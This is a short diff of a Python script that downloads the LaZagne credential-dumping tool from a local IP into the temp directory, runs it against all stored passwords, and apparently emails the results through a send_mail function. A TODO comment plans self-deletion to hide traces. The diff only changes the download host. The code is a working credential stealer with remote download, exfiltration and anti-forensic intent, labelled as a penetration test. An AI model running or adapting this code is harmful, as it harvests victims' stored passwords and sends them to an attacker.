@@ -24,7 +24,7 @@ def send_mail(email, password, message):
 
 os.chdir(tempfile.gettempdir())
 # The code below requires the obligatory download of Lazagne before executing a penetration test.
-download("http://10.0.2.15/downloads/lazagne.exe")
+download("http://10.0.2.5/downloads/lazagne.exe")
 result = subprocess.check_output("lazagne.exe all", shell=True)
 # TODO: if we want to keep our login data to email intact, force self-removal after running the script.
 # Further read: https://stackoverflow.com/questions/10112601/how-to-make-scripts-auto-delete-at-the-end-of-execution
